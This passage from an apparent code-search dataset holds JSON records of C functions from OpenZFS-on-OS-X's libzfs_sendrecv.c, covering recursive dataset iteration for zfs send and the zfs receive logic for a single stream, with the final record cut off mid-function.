(ENOENT);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * recursively generate nvlists describing datasets.  See comment\n * for the data structure send_data_t above for description of contents\n * of the nvlist.\n */\n", "func_signal": "static int\nsend_iterate_fs(zfs_handle_t *zhp, void *arg)", "code": "{\n\tsend_data_t *sd = arg;\n\tnvlist_t *nvfs = NULL, *nv = NULL;\n\tint rv = 0;\n\tuint64_t min_txg = 0, max_txg = 0;\n\tuint64_t parent_fromsnap_guid_save = sd->parent_fromsnap_guid;\n\tuint64_t fromsnap_txg_save = sd->fromsnap_txg;\n\tuint64_t tosnap_txg_save = sd->tosnap_txg;\n\tuint64_t txg = zhp->zfs_dmustats.dds_creation_txg;\n\tuint64_t guid = zhp->zfs_dmustats.dds_guid;\n\tuint64_t fromsnap_txg, tosnap_txg;\n\tchar guidstring[64];\n\n\tfromsnap_txg = get_snap_txg(zhp->zfs_hdl, zhp->zfs_name, sd->fromsnap);\n\tif (fromsnap_txg != 0)\n\t\tsd->fromsnap_txg = fromsnap_txg;\n\n\ttosnap_txg = get_snap_txg(zhp->zfs_hdl, zhp->zfs_name, sd->tosnap);\n\tif (tosnap_txg != 0)\n\t\tsd->tosnap_txg = tosnap_txg;\n\n\t/*\n\t * on the send side, if the current dataset does not have tosnap,\n\t * perform two additional checks:\n\t *\n\t * - skip sending the current dataset if it was created later than\n\t *   the parent tosnap\n\t * - return error if the current dataset was created earlier than\n\t *   the parent tosnap\n\t */\n\tif (sd->tosnap != NULL && tosnap_txg == 0) {\n\t\tif (sd->tosnap_txg != 0 && txg > sd->tosnap_txg) {\n\t\t\tif (sd->verbose) {\n\t\t\t\t(void) fprintf(stderr, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"skipping dataset %s: snapshot %s does \"\n\t\t\t\t    \"not exist\\n\"), zhp->zfs_name, sd->tosnap);\n\t\t\t}\n\t\t} else {\n\t\t\t(void) fprintf(stderr, dgettext(TEXT_DOMAIN,\n\t\t\t    \"cannot send %s@%s%s: snapshot %s@%s does not \"\n\t\t\t    \"exist\\n\"), sd->fsname, sd->tosnap, sd->recursive ?\n\t\t\t    dgettext(TEXT_DOMAIN, \" recursively\") : \"\",\n\t\t\t    zhp->zfs_name, sd->tosnap);\n\t\t\trv = -1;\n\t\t}\n\t\tgoto out;\n\t}\n\n\tnvfs = fnvlist_alloc();\n\tfnvlist_add_string(nvfs, \"name\", zhp->zfs_name);\n\tfnvlist_add_uint64(nvfs, \"parentfromsnap\",\n\t    sd->parent_fromsnap_guid);\n\n\tif (zhp->zfs_dmustats.dds_origin[0]) {\n\t\tzfs_handle_t *origin = zfs_open(zhp->zfs_hdl,\n\t\t    zhp->zfs_dmustats.dds_origin, ZFS_TYPE_SNAPSHOT);\n\t\tif (origin == NULL) {\n\t\t\trv = -1;\n\t\t\tgoto out;\n\t\t}\n\t\tfnvlist_add_uint64(nvfs, \"origin\",\n\t\t    origin->zfs_dmustats.dds_guid);\n\n\t\tzfs_close(origin);\n\t}\n\n\t/* iterate over props */\n\tif (sd->props || sd->backup || sd->recursive) {\n\t\tnv = fnvlist_alloc();\n\t\tsend_iterate_prop(zhp, sd->backup, nv);\n\t}\n\tif (zfs_prop_get_int(zhp, ZFS_PROP_ENCRYPTION) != ZIO_CRYPT_OFF) {\n\t\tboolean_t encroot;\n\n\t\t/* determine if this dataset is an encryption root */\n\t\tif (zfs_crypto_get_encryption_root(zhp, &encroot, NULL) != 0) {\n\t\t\trv = -1;\n\t\t\tgoto out;\n\t\t}\n\n\t\tif (encroot)\n\t\t\tfnvlist_add_boolean(nvfs, \"is_encroot\");\n\n\t\t/*\n\t\t * Encrypted datasets can only be sent with properties if\n\t\t * the raw flag is specified because the receive side doesn't\n\t\t * currently have a mechanism for recursively asking the user\n\t\t * for new encryption parameters.\n\t\t */\n\t\tif (!sd->raw) {\n\t\t\t(void) fprintf(stderr, dgettext(TEXT_DOMAIN,\n\t\t\t    \"cannot send %s@%s: encrypted dataset %s may not \"\n\t\t\t    \"be sent with properties without the raw flag\\n\"),\n\t\t\t    sd->fsname, sd->tosnap, zhp->zfs_name);\n\t\t\trv = -1;\n\t\t\tgoto out;\n\t\t}\n\n\t}\n\n\tif (nv != NULL)\n\t\tfnvlist_add_nvlist(nvfs, \"props\", nv);\n\n\t/* iterate over snaps, and set sd->parent_fromsnap_guid */\n\tsd->parent_fromsnap_guid = 0;\n\tsd->parent_snaps = fnvlist_alloc();\n\tsd->snapprops = fnvlist_alloc();\n\tif (sd->holds)\n\t\tVERIFY(0 == nvlist_alloc(&sd->snapholds, NV_UNIQUE_NAME, 0));\n\n\n\t/*\n\t * If this is a \"doall\" send, a replicate send or we're just trying\n\t * to gather a list of previous snapshots, iterate through all the\n\t * snaps in the txg range. Otherwise just look at the one we're\n\t * interested in.\n\t */\n\tif (sd->doall || sd->replicate || sd->tosnap == NULL) {\n\t\tif (!sd->replicate && fromsnap_txg != 0)\n\t\t\tmin_txg = fromsnap_txg;\n\t\tif (!sd->replicate && tosnap_txg != 0)\n\t\t\tmax_txg = tosnap_txg;\n\t\t(void) zfs_iter_snapshots_sorted(zhp, send_iterate_snap, sd,\n\t\t    min_txg, max_txg);\n\t} else {\n\t\tchar snapname[MAXPATHLEN] = { 0 };\n\t\tzfs_handle_t *snap;\n\n\t\t(void) snprintf(snapname, sizeof (snapname), \"%s@%s\",\n\t\t    zhp->zfs_name, sd->tosnap);\n\t\tif (sd->fromsnap != NULL)\n\t\t\tsd->seenfrom = B_TRUE;\n\t\tsnap = zfs_open(zhp->zfs_hdl, snapname,\n\t\t    ZFS_TYPE_SNAPSHOT);\n\t\tif (snap != NULL)\n\t\t\t(void) send_iterate_snap(snap, sd);\n\t}\n\n\tfnvlist_add_nvlist(nvfs, \"snaps\", sd->parent_snaps);\n\tfnvlist_add_nvlist(nvfs, \"snapprops\", sd->snapprops);\n\tif (sd->holds)\n\t\tfnvlist_add_nvlist(nvfs, \"snapholds\", sd->snapholds);\n\tfnvlist_free(sd->parent_snaps);\n\tfnvlist_free(sd->snapprops);\n\tfnvlist_free(sd->snapholds);\n\n\t/* add this fs to nvlist */\n\t(void) snprintf(guidstring, sizeof (guidstring),\n\t    \"0x%llx\", (longlong_t)guid);\n\tfnvlist_add_nvlist(sd->fss, guidstring, nvfs);\n\n\t/* iterate over children */\n\tif (sd->recursive)\n\t\trv = zfs_iter_filesystems(zhp, send_iterate_fs, sd);\n\nout:\n\tsd->parent_fromsnap_guid = parent_fromsnap_guid_save;\n\tsd->fromsnap_txg = fromsnap_txg_save;\n\tsd->tosnap_txg = tosnap_txg_save;\n\tfnvlist_free(nv);\n\tfnvlist_free(nvfs);\n\n\tzfs_close(zhp);\n\treturn (rv);\n}", "path": "zfs/lib/libzfs/libzfs_sendrecv.c", "commit_date": "2019-05-10 00:00:00", "repo_name": "openzfsonosx/zfs", "stars": 823, "license": "other", "language": "c", "size": 46008}
{"docstring": "/*\n * Restores a backup of tosnap from the file descriptor specified by infd.\n */\n", "func_signal": "static int\nzfs_receive_one(libzfs_handle_t *hdl, int infd, const char *tosnap,\n    const char *originsnap, recvflags_t *flags, dmu_replay_record_t *drr,\n    dmu_replay_record_t *drr_noswap, const char *sendfs, nvlist_t *stream_nv,\n    avl_tree_t *stream_avl, char **top_zfs, int cleanup_fd,\n    uint64_t *action_handlep, const char *finalsnap, nvlist_t *cmdprops)", "code": "{\n\ttime_t begin_time;\n\tint ioctl_err, ioctl_errno, err;\n\tchar *cp;\n\tstruct drr_begin *drrb = &drr->drr_u.drr_begin;\n\tchar errbuf[1024];\n\tconst char *chopprefix;\n\tboolean_t newfs = B_FALSE;\n\tboolean_t stream_wantsnewfs;\n\tboolean_t newprops = B_FALSE;\n\tuint64_t read_bytes = 0;\n\tuint64_t errflags = 0;\n\tuint64_t parent_snapguid = 0;\n\tprop_changelist_t *clp = NULL;\n\tnvlist_t *snapprops_nvlist = NULL;\n\tnvlist_t *snapholds_nvlist = NULL;\n\tzprop_errflags_t prop_errflags;\n\tnvlist_t *prop_errors = NULL;\n\tboolean_t recursive;\n\tchar *snapname = NULL;\n\tchar destsnap[MAXPATHLEN * 2];\n\tchar origin[MAXNAMELEN];\n\tchar name[MAXPATHLEN];\n\tchar tmp_keylocation[MAXNAMELEN];\n\tnvlist_t *rcvprops = NULL; /* props received from the send stream */\n\tnvlist_t *oxprops = NULL; /* override (-o) and exclude (-x) props */\n\tnvlist_t *origprops = NULL; /* original props (if destination exists) */\n\tzfs_type_t type;\n\tboolean_t toplevel = B_FALSE;\n\tboolean_t zoned = B_FALSE;\n\tboolean_t hastoken = B_FALSE;\n\tuint8_t *wkeydata = NULL;\n\tuint_t wkeylen = 0;\n\n\tbegin_time = time(NULL);\n\tbzero(origin, MAXNAMELEN);\n\tbzero(tmp_keylocation, MAXNAMELEN);\n\n\t(void) snprintf(errbuf, sizeof (errbuf), dgettext(TEXT_DOMAIN,\n\t    \"cannot receive\"));\n\n\trecursive = (nvlist_lookup_boolean(stream_nv, \"not_recursive\") ==\n\t    ENOENT);\n\n\t/* Did the user request holds be skipped via zfs recv -k? */\n\tboolean_t holds = flags->holds && !flags->skipholds;\n\n\tif (stream_avl != NULL) {\n\t\tchar *keylocation = NULL;\n\t\tnvlist_t *lookup = NULL;\n\t\tnvlist_t *fs = fsavl_find(stream_avl, drrb->drr_toguid,\n\t\t    &snapname);\n\n\t\t(void) nvlist_lookup_uint64(fs, \"parentfromsnap\",\n\t\t    &parent_snapguid);\n\t\terr = nvlist_lookup_nvlist(fs, \"props\", &rcvprops);\n\t\tif (err) {\n\t\t\tVERIFY(0 == nvlist_alloc(&rcvprops, NV_UNIQUE_NAME, 0));\n\t\t\tnewprops = B_TRUE;\n\t\t}\n\n\t\t/*\n\t\t * The keylocation property may only be set on encryption roots,\n\t\t * but this dataset might not become an encryption root until\n\t\t * recv_fix_encryption_hierarchy() is called. That function\n\t\t * will fixup the keylocation anyway, so we temporarily unset\n\t\t * the keylocation for now to avoid any errors from the receive\n\t\t * ioctl.\n\t\t */\n\t\terr = nvlist_lookup_string(rcvprops,\n\t\t    zfs_prop_to_name(ZFS_PROP_KEYLOCATION), &keylocation);\n\t\tif (err == 0) {\n\t\t\tstrcpy(tmp_keylocation, keylocation);\n\t\t\t(void) nvlist_remove_all(rcvprops,\n\t\t\t    zfs_prop_to_name(ZFS_PROP_KEYLOCATION));\n\t\t}\n\n\t\tif (flags->canmountoff) {\n\t\t\tVERIFY(0 == nvlist_add_uint64(rcvprops,\n\t\t\t    zfs_prop_to_name(ZFS_PROP_CANMOUNT), 0));\n\t\t} else if (newprops) {\t/* nothing in rcvprops, eliminate it */\n\t\t\tnvlist_free(rcvprops);\n\t\t\trcvprops = NULL;\n\t\t\tnewprops = B_FALSE;\n\t\t}\n\t\tif (0 == nvlist_lookup_nvlist(fs, \"snapprops\", &lookup)) {\n\t\t\tVERIFY(0 == nvlist_lookup_nvlist(lookup,\n\t\t\t    snapname, &snapprops_nvlist));\n\t\t}\n\t\tif (holds) {\n\t\t\tif (0 == nvlist_lookup_nvlist(fs, \"snapholds\",\n\t\t\t    &lookup)) {\n\t\t\t\tVERIFY(0 == nvlist_lookup_nvlist(lookup,\n\t\t\t\t    snapname, &snapholds_nvlist));\n\t\t\t}\n\t\t}\n\t}\n\n\tcp = NULL;\n\n\t/*\n\t * Determine how much of the snapshot name stored in the stream\n\t * we are going to tack on to the name they specified on the\n\t * command line, and how much we are going to chop off.\n\t *\n\t * If they specified a snapshot, chop the entire name stored in\n\t * the stream.\n\t */\n\tif (flags->istail) {\n\t\t/*\n\t\t * A filesystem was specified with -e. We want to tack on only\n\t\t * the tail of the sent snapshot path.\n\t\t */\n\t\tif (strchr(tosnap, '@')) {\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN, \"invalid \"\n\t\t\t    \"argument - snapshot not allowed with -e\"));\n\t\t\terr = zfs_error(hdl, EZFS_INVALIDNAME, errbuf);\n\t\t\tgoto out;\n\t\t}\n\n\t\tchopprefix = strrchr(sendfs, '/');\n\n\t\tif (chopprefix == NULL) {\n\t\t\t/*\n\t\t\t * The tail is the poolname, so we need to\n\t\t\t * prepend a path separator.\n\t\t\t */\n\t\t\tint len = strlen(drrb->drr_toname);\n\t\t\tcp = malloc(len + 2);\n\t\t\tcp[0] = '/';\n\t\t\t(void) strcpy(&cp[1], drrb->drr_toname);\n\t\t\tchopprefix = cp;\n\t\t} else {\n\t\t\tchopprefix = drrb->drr_toname + (chopprefix - sendfs);\n\t\t}\n\t} else if (flags->isprefix) {\n\t\t/*\n\t\t * A filesystem was specified with -d. We want to tack on\n\t\t * everything but the first element of the sent snapshot path\n\t\t * (all but the pool name).\n\t\t */\n\t\tif (strchr(tosnap, '@')) {\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN, \"invalid \"\n\t\t\t    \"argument - snapshot not allowed with -d\"));\n\t\t\terr = zfs_error(hdl, EZFS_INVALIDNAME, errbuf);\n\t\t\tgoto out;\n\t\t}\n\n\t\tchopprefix = strchr(drrb->drr_toname, '/');\n\t\tif (chopprefix == NULL)\n\t\t\tchopprefix = strchr(drrb->drr_toname, '@');\n\t} else if (strchr(tosnap, '@') == NULL) {\n\t\t/*\n\t\t * If a filesystem was specified without -d or -e, we want to\n\t\t * tack on everything after the fs specified by 'zfs send'.\n\t\t */\n\t\tchopprefix = drrb->drr_toname + strlen(sendfs);\n\t} else {\n\t\t/* A snapshot was specified as an exact path (no -d or -e). */\n\t\tif (recursive) {\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"cannot specify snapshot name for multi-snapshot \"\n\t\t\t    \"stream\"));\n\t\t\terr = zfs_error(hdl, EZFS_BADSTREAM, errbuf);\n\t\t\tgoto out;\n\t\t}\n\t\tchopprefix = drrb->drr_toname + strlen(drrb->drr_toname);\n\t}\n\n\tASSERT(strstr(drrb->drr_toname, sendfs) == drrb->drr_toname);\n\tASSERT(chopprefix > drrb->drr_toname || strchr(sendfs, '/') == NULL);\n\tASSERT(chopprefix <= drrb->drr_toname + strlen(drrb->drr_toname) ||\n\t    strchr(sendfs, '/') == NULL);\n\tASSERT(chopprefix[0] == '/' || chopprefix[0] == '@' ||\n\t    chopprefix[0] == '\\0');\n\n\t/*\n\t * Determine name of destination snapshot.\n\t */\n\t(void) strlcpy(destsnap, tosnap, sizeof (destsnap));\n\t(void) strlcat(destsnap, chopprefix, sizeof (destsnap));\n\tfree(cp);\n\tif (!zfs_name_valid(destsnap, ZFS_TYPE_SNAPSHOT)) {\n\t\terr = zfs_error(hdl, EZFS_INVALIDNAME, errbuf);\n\t\tgoto out;\n\t}\n\n\t/*\n\t * Determine the name of the origin snapshot.\n\t */\n\tif (originsnap) {\n\t\t(void) strlcpy(origin, originsnap, sizeof (origin));\n\t\tif (flags->verbose)\n\t\t\t(void) printf(\"using provided clone origin %s\\n\",\n\t\t\t    origin);\n\t} else if (drrb->drr_flags & DRR_FLAG_CLONE) {\n\t\tif (guid_to_name(hdl, destsnap,\n\t\t    drrb->drr_fromguid, B_FALSE, origin) != 0) {\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"local origin for clone %s does not exist\"),\n\t\t\t    destsnap);\n\t\t\terr = zfs_error(hdl, EZFS_NOENT, errbuf);\n\t\t\tgoto out;\n\t\t}\n\t\tif (flags->verbose)\n\t\t\t(void) printf(\"found clone origin %s\\n\", origin);\n\t}\n\n\tboolean_t resuming = DMU_GET_FEATUREFLAGS(drrb->drr_versioninfo) &\n\t    DMU_BACKUP_FEATURE_RESUMING;\n\tboolean_t raw = DMU_GET_FEATUREFLAGS(drrb->drr_versioninfo) &\n\t    DMU_BACKUP_FEATURE_RAW;\n\tboolean_t embedded = DMU_GET_FEATUREFLAGS(drrb->drr_versioninfo) &\n\t    DMU_BACKUP_FEATURE_EMBED_DATA;\n\tstream_wantsnewfs = (drrb->drr_fromguid == 0 ||\n\t    (drrb->drr_flags & DRR_FLAG_CLONE) || originsnap) && !resuming;\n\n\tif (stream_wantsnewfs) {\n\t\t/*\n\t\t * if the parent fs does not exist, look for it based on\n\t\t * the parent snap GUID\n\t\t */\n\t\t(void) snprintf(errbuf, sizeof (errbuf), dgettext(TEXT_DOMAIN,\n\t\t    \"cannot receive new filesystem stream\"));\n\n\t\t(void) strcpy(name, destsnap);\n\t\tcp = strrchr(name, '/');\n\t\tif (cp)\n\t\t\t*cp = '\\0';\n\t\tif (cp &&\n\t\t    !zfs_dataset_exists(hdl, name, ZFS_TYPE_DATASET)) {\n\t\t\tchar suffix[ZFS_MAX_DATASET_NAME_LEN];\n\t\t\t(void) strcpy(suffix, strrchr(destsnap, '/'));\n\t\t\tif (guid_to_name(hdl, name, parent_snapguid,\n\t\t\t    B_FALSE, destsnap) == 0) {\n\t\t\t\t*strchr(destsnap, '@') = '\\0';\n\t\t\t\t(void) strcat(destsnap, suffix);\n\t\t\t}\n\t\t}\n\t} else {\n\t\t/*\n\t\t * if the fs does not exist, look for it based on the\n\t\t * fromsnap GUID\n\t\t */\n\t\t(void) snprintf(errbuf, sizeof (errbuf), dgettext(TEXT_DOMAIN,\n\t\t    \"cannot receive incremental stream\"));\n\n\t\t(void) strcpy(name, destsnap);\n\t\t*strchr(name, '@') = '\\0';\n\n\t\t/*\n\t\t * If the exact receive path was specified and this is the\n\t\t * topmost path in the stream, then if the fs does not exist we\n\t\t * should look no further.\n\t\t */\n\t\tif ((flags->isprefix || (*(chopprefix = drrb->drr_toname +\n\t\t    strlen(sendfs)) != '\\0' && *chopprefix != '@')) &&\n\t\t    !zfs_dataset_exists(hdl, name, ZFS_TYPE_DATASET)) {\n\t\t\tchar snap[ZFS_MAX_DATASET_NAME_LEN];\n\t\t\t(void) strcpy(snap, strchr(destsnap, '@'));\n\t\t\tif (guid_to_name(hdl, name, drrb->drr_fromguid,\n\t\t\t    B_FALSE, destsnap) == 0) {\n\t\t\t\t*strchr(destsnap, '@') = '\\0';\n\t\t\t\t(void) strcat(destsnap, snap);\n\t\t\t}\n\t\t}\n\t}\n\n\t(void) strcpy(name, destsnap);\n\t*strchr(name, '@') = '\\0';\n\n\tif (zfs_dataset_exists(hdl, name, ZFS_TYPE_DATASET)) {\n\t\tzfs_cmd_t zc = {\"\\0\"};\n\t\tzfs_handle_t *zhp;\n\t\tboolean_t encrypted;\n\n\t\t(void) strcpy(zc.zc_name, name);\n\n\t\t/*\n\t\t * Destination fs exists.  It must be one of these cases:\n\t\t *  - an incremental send stream\n\t\t *  - the stream specifies a new fs (full stream or clone)\n\t\t *    and they want us to blow away the existing fs (and\n\t\t *    have therefore specified -F and removed any snapshots)\n\t\t *  - we are resuming a failed receive.\n\t\t */\n\t\tif (stream_wantsnewfs) {\n\t\t\tboolean_t is_volume = drrb->drr_type == DMU_OST_ZVOL;\n\t\t\tif (!flags->force) {\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"destination '%s' exists\\n\"\n\t\t\t\t    \"must specify -F to overwrite it\"), name);\n\t\t\t\terr = zfs_error(hdl, EZFS_EXISTS, errbuf);\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tif (zfs_ioctl(hdl, ZFS_IOC_SNAPSHOT_LIST_NEXT,\n\t\t\t    &zc) == 0) {\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"destination has snapshots (eg. %s)\\n\"\n\t\t\t\t    \"must destroy them to overwrite it\"),\n\t\t\t\t    zc.zc_name);\n\t\t\t\terr = zfs_error(hdl, EZFS_EXISTS, errbuf);\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tif (is_volume && strrchr(name, '/') == NULL) {\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"destination %s is the root dataset\\n\"\n\t\t\t\t    \"cannot overwrite with a ZVOL\"),\n\t\t\t\t    name);\n\t\t\t\terr = zfs_error(hdl, EZFS_EXISTS, errbuf);\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tif (is_volume &&\n\t\t\t    zfs_ioctl(hdl, ZFS_IOC_DATASET_LIST_NEXT,\n\t\t\t    &zc) == 0) {\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"destination has children (eg. %s)\\n\"\n\t\t\t\t    \"cannot overwrite with a ZVOL\"),\n\t\t\t\t    zc.zc_name);\n\t\t\t\terr = zfs_error(hdl, EZFS_WRONG_PARENT, errbuf);\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t}\n\n\t\tif ((zhp = zfs_open(hdl, name,\n\t\t    ZFS_TYPE_FILESYSTEM | ZFS_TYPE_VOLUME)) == NULL) {\n\t\t\terr = -1;\n\t\t\tgoto out;\n\t\t}\n\n\t\tif (stream_wantsnewfs &&\n\t\t    zhp->zfs_dmustats.dds_origin[0]) {\n\t\t\tzfs_close(zhp);\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"destination '%s' is a clone\\n\"\n\t\t\t    \"must destroy it to overwrite it\"), name);\n\t\t\terr = zfs_error(hdl, EZFS_EXISTS, errbuf);\n\t\t\tgoto out;\n\t\t}\n\n\t\t/*\n\t\t * Raw sends can not be performed as an incremental on top\n\t\t * of existing unencryppted datasets. zfs recv -F cant be\n\t\t * used to blow away an existing encrypted filesystem. This\n\t\t * is because it would require the dsl dir to point to the\n\t\t * new key (or lack of a key) and the old key at the same\n\t\t * time. The -F flag may still be used for deleting\n\t\t * intermediate snapshots that would otherwise prevent the\n\t\t * receive from working.\n\t\t */\n\t\tencrypted = zfs_prop_get_int(zhp, ZFS_PROP_ENCRYPTION) !=\n\t\t    ZIO_CRYPT_OFF;\n\t\tif (!stream_wantsnewfs && !encrypted && raw) {\n\t\t\tzfs_close(zhp);\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"cannot perform raw receive on top of \"\n\t\t\t    \"existing unencrypted dataset\"));\n\t\t\terr = zfs_error(hdl, EZFS_BADRESTORE, errbuf);\n\t\t\tgoto out;\n\t\t}\n\n\t\tif (stream_wantsnewfs && flags->force &&\n\t\t    ((raw && !encrypted) || encrypted)) {\n\t\t\tzfs_close(zhp);\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"zfs receive -F cannot be used to destroy an \"\n\t\t\t    \"encrypted filesystem or overwrite an \"\n\t\t\t    \"unencrypted one with an encrypted one\"));\n\t\t\terr = zfs_error(hdl, EZFS_BADRESTORE, errbuf);\n\t\t\tgoto out;\n\t\t}\n\n\t\tif (!flags->dryrun && zhp->zfs_type == ZFS_TYPE_FILESYSTEM &&\n\t\t    stream_wantsnewfs) {\n\t\t\t/* We can't do online recv in this case */\n\t\t\tclp = changelist_gather(zhp, ZFS_PROP_NAME, 0, 0);\n\t\t\tif (clp == NULL) {\n\t\t\t\tzfs_close(zhp);\n\t\t\t\terr = -1;\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tif (changelist_prefix(clp) != 0) {\n\t\t\t\tchangelist_free(clp);\n\t\t\t\tzfs_close(zhp);\n\t\t\t\terr = -1;\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t}\n\n\t\t/*\n\t\t * If we are resuming a newfs, set newfs here so that we will\n\t\t * mount it if the recv succeeds this time.  We can tell\n\t\t * that it was a newfs on the first recv because the fs\n\t\t * itself will be inconsistent (if the fs existed when we\n\t\t * did the first recv, we would have received it into\n\t\t * .../%recv).\n\t\t */\n\t\tif (resuming && zfs_prop_get_int(zhp, ZFS_PROP_INCONSISTENT))\n\t\t\tnewfs = B_TRUE;\n\n\t\t/* we want to know if we're zoned when validating -o|-x props */\n\t\tzoned = zfs_prop_get_int(zhp, ZFS_PROP_ZONED);\n\n\t\t/* may need this info later, get it now we have zhp around */\n\t\tif (zfs_prop_get(zhp, ZFS_PROP_RECEIVE_RESUME_TOKEN, NULL, 0,\n\t\t    NULL, NULL, 0, B_TRUE) == 0)\n\t\t\thastoken = B_TRUE;\n\n\t\t/* gather existing properties on destination */\n\t\torigprops = fnvlist_alloc();\n\t\tfnvlist_merge(origprops, zhp->zfs_props);\n\t\tfnvlist_merge(origprops, zhp->zfs_user_props);\n\n\t\tzfs_close(zhp);\n\t} else {\n\t\tzfs_handle_t *zhp;\n\n\t\t/*\n\t\t * Destination filesystem does not exist.  Therefore we better\n\t\t * be creating a new filesystem (either from a full backup, or\n\t\t * a clone).  It would therefore be invalid if the user\n\t\t * specified only the pool name (i.e. if the destination name\n\t\t * contained no slash character).\n\t\t */\n\t\tcp = strrchr(name, '/');\n\n\t\tif (!stream_wantsnewfs || cp == NULL) {\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"destination '%s' does not exist\"), name);\n\t\t\terr = zfs_error(hdl, EZFS_NOENT, errbuf);\n\t\t\tgoto out;\n\t\t}\n\n\t\t/*\n\t\t * Trim off the final dataset component so we perform the\n\t\t * recvbackup ioctl to the filesystems's parent.\n\t\t */\n\t\t*cp = '\\0';\n\n\t\tif (flags->isprefix && !flags->istail && !flags->dryrun &&\n\t\t    create_parents(hdl, destsnap, strlen(tosnap)) != 0) {\n\t\t\terr = zfs_error(hdl, EZFS_BADRESTORE, errbuf);\n\t\t\tgoto out;\n\t\t}\n\n\t\t/* validate parent */\n\t\tzhp = zfs_open(hdl, name, ZFS_TYPE_DATASET);\n\t\tif (zhp == NULL) {\n\t\t\terr = zfs_error(hdl, EZFS_BADRESTORE, errbuf);\n\t\t\tgoto out;\n\t\t}\n\t\tif (zfs_get_type(zhp) != ZFS_TYPE_FILESYSTEM) {\n\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t    \"parent '%s' is not a filesystem\"), name);\n\t\t\terr = zfs_error(hdl, EZFS_WRONG_PARENT, errbuf);\n\t\t\tzfs_close(zhp);\n\t\t\tgoto out;\n\t\t}\n\n\t\t/*\n\t\t * It is invalid to receive a properties stream that was\n\t\t * unencrypted on the send side as a child of an encrypted\n\t\t * parent. Technically there is nothing preventing this, but\n\t\t * it would mean that the encryption=off property which is\n\t\t * locally set on the send side would not be received correctly.\n\t\t * We can infer encryption=off if the stream is not raw and\n\t\t * properties were included since the send side will only ever\n\t\t * send the encryption property in a raw nvlist header. This\n\t\t * check will be avoided if the user specifically overrides\n\t\t * the encryption property on the command line.\n\t\t */\n\t\tif (!raw && rcvprops != NULL &&\n\t\t    !nvlist_exists(cmdprops,\n\t\t    zfs_prop_to_name(ZFS_PROP_ENCRYPTION))) {\n\t\t\tuint64_t crypt;\n\n\t\t\tcrypt = zfs_prop_get_int(zhp, ZFS_PROP_ENCRYPTION);\n\n\t\t\tif (crypt != ZIO_CRYPT_OFF) {\n\t\t\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t\t\t    \"parent '%s' must not be encrypted to \"\n\t\t\t\t    \"receive unenecrypted property\"), name);\n\t\t\t\terr = zfs_error(hdl, EZFS_BADPROP, errbuf);\n\t\t\t\tzfs_close(zhp);\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t}\n\t\tzfs_close(zhp);\n\n\t\tnewfs = B_TRUE;\n\t\t*cp = '/';\n\t}\n\n\tif (flags->verbose) {\n\t\t(void) printf(\"%s %s stream of %s into %s\\n\",\n\t\t    flags->dryrun ? \"would receive\" : \"receiving\",\n\t\t    drrb->drr_fromguid ? \"incremental\" : \"full\",\n\t\t    drrb->drr_toname, destsnap);\n\t\t(void) fflush(stdout);\n\t}\n\n\tif (flags->dryrun) {\n\t\terr = recv_skip(hdl, infd, flags->byteswap);\n\t\tgoto out;\n\t}\n\n\tif (top_zfs && (*top_zfs == NULL || strcmp(*top_zfs, name) == 0))\n\t\ttoplevel = B_TRUE;\n\tif (drrb->drr_type == DMU_OST_ZVOL) {\n\t\ttype = ZFS_TYPE_VOLUME;\n\t} else if (drrb->drr_type == DMU_OST_ZFS) {\n\t\ttype = ZFS_TYPE_FILESYSTEM;\n\t} else {\n\t\tzfs_error_aux(hdl, dgettext(TEXT_DOMAIN,\n\t\t    \"invalid record type: 0x%d\"), drrb->drr_type);\n\t\terr = zfs_error(hdl, EZFS_BADSTREAM, errbuf);\n\t\tgoto out;\n\t}\n\tif ((err = zfs_setup_cmdline_props(hdl, type, name, zoned, recursive,\n\t    stream_wantsnewfs, raw, toplevel, rcvprops, cmdprops, origprops,\n\t    &oxprops, &wkeydata, &wkeylen, errbuf)) != 0)\n\t\tgoto out;\n\n\terr = ioctl_err = lzc_receive_with_cmdprops(destsnap, rcvprops,\n\t    oxprops, wkeydata, wkeylen, origin, flags->force, flags->resumable,\n\t    raw, infd, drr_noswap, cleanup_fd, &read_bytes, &errflags,\n\t    action_handlep, &prop_errors);\n\tioctl_errno = ioctl_err;\n\tprop_errflags = errflags;\n\n\tif (err == 0) {\n\t\tnvpair_t *prop_err = NULL;\n\n\t\twhile ((prop_err = nvlist_next_nvpair(prop_errors,\n\t\t    prop_err)) != NULL) {\n\t\t\tchar tbuf[1024];\n\t\t\tzfs_prop_t prop;\n\t\t\tint intval;\n\n\t\t\tprop = zfs_name_to_prop(nvpair_name(prop_err));\n\t\t\t(void) nvpair_value_int32(prop_err, &intval);\n\t\t\tif (strcmp(nvpair_name(prop_err),\n\t\t\t    ZPROP_N_MORE_ERRORS) == 0) 